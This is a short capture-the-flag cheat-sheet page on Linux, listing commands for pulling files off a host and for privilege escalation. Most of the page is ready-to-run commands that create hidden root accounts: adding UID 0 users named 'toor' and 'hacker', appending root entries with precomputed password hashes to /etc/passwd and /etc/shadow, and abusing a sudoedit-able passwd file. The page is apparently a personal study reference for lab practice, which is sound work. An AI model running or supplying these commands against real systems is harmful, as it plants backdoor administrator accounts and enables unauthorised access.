---
layout: article
title: Nix
permalink: /wikis/ctf/nix
aside:
    toc: true
sidebar:
    nav: wikis
---

## File Transfer

Grab all files from directory
```bash
wget -r -nH --no-parent http://<host-ip>/<dir>/ --reject="index.html*" -q
```

Transfer binary by base64 encoding (-w0 to omit line-wrapping)<br>
On remote machine:
```bash
base64 -w0 <file>
```
Copy and paste contents into a new file on local machine. <br>
Then, on local machine:
```bash
base64 -d <file> > <newfile>
```


## Privilege Escalation

Exploitable binaries<br>
[https://gtfobins.github.io/](https://gtfobins.github.io/)
<br>
<br>
Adding Users
```bash
adduser --no-create-home --shell /bin/bash toor 
sed -i 's/toor:x:1001:1001/toor:x:0:0/' /etc/passwd 

useradd -m hacker -p 23ZQ03Tm4ejt6 -o -u 0 -g 0 
```
or 
  
```bash
echo "toor:x:0:0::/tmp:/bin/sh" >> /etc/passwd 
echo "toor:23MdZN/rsVdLg:16673:0:99999:7:::" >> /etc/shadow 
```
<br>
<br>
If only <b>/etc/passwd</b> is writable 
```bash
echo "toor:23MdZN/rsVdLg:0:0:,,,:/root:/bin/bash" >> /etc/passwd 
```

Create Hashes for <b>/etc/shadow</b>: 
```bash
openssl passwd -salt 234 <password> 
```
<br>
<br>
Exploiting <b>sudoedit</b>-able <b>/etc/passwd</b><br>
Create a user toor:toor 
```bash
toor:23MdZN/rsVdLg:0:0:,,,:/root:/bin/bash
```